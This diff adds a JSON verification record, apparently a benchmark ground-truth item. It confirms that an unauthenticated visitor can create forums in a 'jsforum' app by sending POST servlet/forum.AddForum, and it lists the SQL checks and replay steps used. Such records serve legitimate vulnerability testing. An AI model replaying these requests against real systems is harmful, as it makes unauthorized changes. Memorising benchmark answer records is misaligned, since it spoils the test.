@@ -1,0 +1,32 @@
+{
+  "gt_id": "GT-039",
+  "app": "jsforum",
+  "verified_at": "2026-09-06T09:13:35.625236+00:00",
+  "verdict": "vulnerable",
+  "summary": "visitor POST servlet/forum.AddForum returned 302; a forum row with the token title was created in the forum database (created=True).",
+  "sql_statements": [
+    {
+      "kind": "scalar",
+      "sql": "SELECT COALESCE(MAX(forum_id), 0) FROM forum_forums"
+    },
+    {
+      "kind": "scalar",
+      "sql": "SELECT COUNT(*) FROM forum_forums WHERE title='DRHLGT_forum_8686015227'"
+    }
+  ],
+  "steps": [
+    {
+      "kind": "instrument",
+      "table": "forum_forums",
+      "token_title": "DRHLGT_forum_8686015227",
+      "lastforum_id": "36"
+    },
+    {
+      "kind": "replay",
+      "role": "visitor (no login)",
+      "request": "POST servlet/forum.AddForum title=DRHLGT_forum_8686015227",
+      "status_code": 302,
+      "forum_row_created": true
+    }
+  ]
+}
